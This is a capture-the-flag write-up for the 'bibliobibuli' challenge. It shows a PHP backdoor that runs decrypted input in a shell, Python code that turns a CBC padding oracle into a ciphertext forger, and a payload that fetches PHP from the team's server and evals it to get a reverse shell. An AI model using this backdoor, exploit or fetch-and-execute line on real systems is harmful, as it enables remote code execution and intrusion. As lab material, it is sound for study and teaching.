# Writeup

This is a writeup for the challenge bibliobibuli, a "web/crypto" challenge from the FE finals CTF, 2022.

The challenge is based around an endpoint which decrypts CBC ciphertexts, then executes the decrypted payload in a shell. The goal is to use a cbc padding oracle attack on the decryption endpoint to create an ECB decryption oracle, and use this to create a CBC ciphertext encoding a reverse shell payload to gain RCE on the server.

As this was a sourceless challenge, and the challenges were not accessible after the event, I couldn't re-verify my memory or get screenshots, so a few details might be off from how it was at the event.

# Initial impressions
The website is relatively simple, running at http://bibliobibuli.ctf, with a range of text documents you can browse. After clicking around i started trying a few random things to see if anything interesting happened. At one point i tried http://bibliobibuli.ctf/flag, and was greeted with the flag, and a loud firstblood message plays :)

Unfortunately this was apparently *not* the intended solution, and after reporting it our solve was eventually removed, and the challenge came back up again with http://bibliobibuli.ctf/flag not showing anything. 

Clicking around the website a bit more, we noticed that you could access a list of files on the server by going one level up from a document to the directory. Here we got a directory of all the viewable text files on the server, as well as a very suspicious file called `x.php`. 

```php
<?php
// Ninja-Pirates were here; this site is now NP-complete.

session_start();

if ($_SESSION["r"] && $_REQUEST["c"]) {
    $r = $_SESSION["r"];
    $c = $_REQUEST["c"];

    $k1 = substr($r, -64, 32);
    $k2 = substr($r, -32, 32);
    $i = "<<NinjaPirates>>";

    $p = openssl_decrypt($c, "AES-256-CBC", $k2, 0, $i);
    if (!$p) {
        http_response_code(500);
        die();
    }

    $d = array(array("pipe", "r"), array("pipe", "w"), array("pipe", "w"));
    $sh = proc_open("sh", $d, $io);
    fwrite($io[0], $p);
    fclose($io[0]);
    $p = stream_get_contents($io[1]);
    fclose($io[1]);
    fclose($io[2]);
    proc_close($sh);

    $c = openssl_encrypt($p, "AES-256-CBC", $k1, 0, $i);
    echo $c;

} else {
    $k = openssl_get_publickey(<<<EOF
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD4mlUi+rNbppdDCfiV46AznT3c
Jh6Jx2u+HJu0HoqAwAJs9MxZYSk9s7sCaGmngf3FMDJvHG5Rnb9qXC3TAAauWTu+
TV+A+A3l5WU+9NMR1RF1WGACTRcHZEnCvdIUDRNHygKTRp+TPq2jfY7DwHnwtqdc
+W2ArHhSOuwD2Jc/gQIDAQAB
-----END PUBLIC KEY-----
EOF
    );
    $r = "\0" . random_bytes(127);
    $_SESSION["r"] = $r;
    $c = "";
    openssl_public_encrypt($r, $c, $k, OPENSSL_NO_PADDING);
    echo base64_encode($c);
}

?>
```

This file is being run at `http://bibliobibuli.ctf/rfcs/x.php`, so post requests to that url trigger this code.

This includes an RSA public key, (presumably the "intended" way of authenticating to this backdoor as a user,) as well as two AES keys. The AES keys are encrypted using the RSA public key and stored in your cookie, so as long as you keep the same cookie, the same keys will be used.

When you send a payload to this server, this section of the code is relevant. 

```php
    $p = openssl_decrypt($c, "AES-256-CBC", $k2, 0, $i);
    if (!$p) {
        http_response_code(500);
        die();
    }

    $d = array(array("pipe", "r"), array("pipe", "w"), array("pipe", "w"));
    $sh = proc_open("sh", $d, $io);
    fwrite($io[0], $p);
    fclose($io[0]);
    $p = stream_get_contents($io[1]);
    fclose($io[1]);
    fclose($io[2]);
    proc_close($sh);

    $c = openssl_encrypt($p, "AES-256-CBC", $k1, 0, $i);
    echo $c;
```

The payload is first decrypted using `openssl_decrypt($c, "AES-256-CBC", $k2, 0, $i)`, (which takes a base64 encoded AES-256-CBC ciphertext and decryots it,) then the result of this gets run as a command in `sh`, and finally, the output of the command being run gets encrypted under key `k1` and returned to the user.

If we could find `k2` we would have RCE, and if we could find `k1` we would be able to get outputs from the server.

Finally, we note that `openssl_decrypt` uses [PKCS#7 padding](https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS#5_and_PKCS#7) and will error out if the padding on the decrypted plaintext is invalid. This is a classic example of an AES-CBC padding oracle.

# CBC Padding Oracle
A CBC padding oracle is something which will take a CBC ciphertext, and tell you whether the decrypted plaintext is correctly padded or not. (IE, the last byte `b` is some value `n` between 1 and 16, and the preceeding `n-1` bytes have the same value.)

By sending a ciphertext at the endpoint, and flipping the bytes in the second to last block, you can work out what xor's into the last block to create padding, and brute force the decryption of the block one byte at a time.

This attack is relatively well documented, [1](https://en.wikipedia.org/wiki/Padding_oracle_attack), [2](https://research.nccgroup.com/2021/02/17/cryptopals-exploiting-cbc-padding-oracles/) [3](https://github.com/flast101/padding-oracle-attack-explained) etc, so i won't go into detail here. All that's important for this challenge is that we can use the padding oracle to create an ECB decryption oracle, that is an oracle which takes one block of an ECB ciphertext, and returns the plaintext.

It's worth noting that in the code for this challenge, the IV is actually fixed. However if we just send two blocks, we can still decrypt the second block by flipping bits in the first block.

This ECB oracle is implemented in the following mish-mash of copied and self written code.

```py

BLOCK_SIZE = 16
target = "http://bibliobibuli.ctf/rfcs/x.php"
# test a ciphertext on endpoint, returning whether padding is well formed or not
def is_padding_ok(x, verbose=False, s=s):
    if verbose:
        print("sending request")
    x = base64.b64encode(x).decode()
    res = s.post(target, data={"c":x})
    if verbose:
        print("incoming pt")
        print(res.text)
        print()
    if res.status_code == 500:
        return False
    else:
        return True


# perform a CBC padding oracle attack to turn the server into an ECB decryption oracle
def attack_message(msg):
    # msg = [x for x in msg ]
    cipherfake=[0] * 16
    plaintext = [0] * 16
    current = 0
    message=b""

    #I devide the list of bytes in blocks, and I put them in another list
    number_of_blocks = int(len(msg)/BLOCK_SIZE)
    blocks = [[]] * number_of_blocks
    for i in (range(number_of_blocks)):
        blocks[i] = msg[i * BLOCK_SIZE: (i + 1) * BLOCK_SIZE]

    for z in range(len(blocks)-1):  #for each message, I calculate the number of block
        for itera in tqdm(range(1,17)): #the length of each block is 16. I start by one because than I use its in a counter

            for v in range(256):
                cipherfake[-itera]=v
                if is_padding_ok(bytes(cipherfake)+blocks[z+1]): #the idea is that I put in 'is_padding_ok' the cipherfake(array of all 0) plus the last block
                                                                 #if the function return true I found the value
                    current=itera
                    plaintext[-itera]= v^itera^blocks[z][-itera]
                    print(plaintext)

            for w in range(1,current+1):
                cipherfake[-w] = plaintext[-w]^itera+1^blocks[z][-w] #for decode the second byte I must set the previous bytes with 'itera+1'

        message += bytes(plaintext)
        print(message)

    return message
```

# ECB decryption to CBC encryption
Being able to decrypt is nice, but we don't have any ciphertext to decrypt. However, if we could encrypt a CBC ciphertext of our choice then we would be done!

Luckily, the ECB decryption oracle can be used to create a CBC encryption oracle for arbitrary messages! To do this we use the structure of the CBC cipher mode. 

Imagine we want to encrypt the message `pt = b'ABCDABCDABCDABCD'` in the last block. First we "decrypt" some arbitrary ciphertext, for example 16 null bytes, `\x00*16`. Once we have the decryption `d = dec(\x00*16)`, of this, we can just make the block of the ciphertext before it be `XOR(d,pt)`. Now during decryption, the server will decrypt `\x00*16` to `d`, then xor the previous ciphertext on, leaving us with `pt`.

Now we have the issue of the penultimate block being some random uncontrolled series of bytes. However we can just decrypt this again using the oracle, get the decryption of this random sequence of bytes, then set the block before that to be the thing that XOR's the decryption of the to the penultimate block of the target payload.

We can just keep doing this all the way backwards, building up our ciphertext by finding what we need to xor into each blocks plaintext to make it right, until we have the whole plaintext formed, and then we make the IV the thing needed to make the first block decrypt correctly and we're done!

Recalling that the IV in this challenge is fixed, this means we can't actually control the first block of our plaintext using this technique. However as the entire payload is passed to `sh`, we can just leave that as random, then start our payload in the second block, with the first byte being `\n`. This makes it so the random bytes get sent to `sh`, the output is ignored, then a newline is send, then our payload comes on the next line.


```py
# Uses the ECB decryption oracle to create ciphertexts.
def forge_ct(target):
    target = b'\n' + target
    target = pad(target,16)
    target_blocks = [target[i:i+16] for i in range(0, len(target), 16)]
    ctplain = b'\x00'*(len(target) + 16)
    ct_blocks = [ctplain[i:i+16] for i in range(0, len(ctplain), 16)]
    ctlast = b'\x00'*16
    payload_ct = b''
    for x in target_blocks[::-1]:
        ct = b'\x00'*16 + ctlast
        # attack_message is the ECB decryption algorithm above, which exploits the padding oracle to decrypt blocks
        val = attack_message(ct)
        payload_ct = ct[16:] + payload_ct
        ctlast = xor(val,x)
        print(f'current iter = {ctlast + payload_ct}')
    payload_ct = ctlast + payload_ct
    return payload_ct

# payload which queries our endpoint, and runs the code it receives.
# As payloads take a while to generate, this let us experiment with various reverse shells without needing to remake payload.
payload = b"php -r 'eval(file_get_contents(\"http://wep.dk:81\"));'"
```

# Gaining RCE
After experimenting on the server, we found it didn't have many tools we could use for an easy reverse shell. However we knew it had to have PHP. 

At this point we had arbitrary RCE on the server, however getting the flag took another >1h, as we had issues with the exploit randomly not working, shells dying, and weird inconsistent behaviour. At this point Segphault managed to get first blood, so with that off the table we decided to do it properly.

As each payload took a while to generate, we made a payload of the message 
```
b"php -r 'eval(file_get_contents(\"http://wep.dk:81\"));'"`
```

Which queried our server and executed the response, and we sent this to the server in a loop every 10 seconds, while we developed our payload on the wep.dk website. 

Eventually we got a random php reverse shell working, got a shell, and got the flag :)


# Closing Thoughts

This was a fun challenge, as it used a combination of web and crypto knowledge, allowing myself to work well together with a teammate :)

It also made me really want to make a proper multithreaded/async cbc padding oracle exploit script, as doing it single thread waiting 256 round trips per byte really sucked. Maybe a future project.
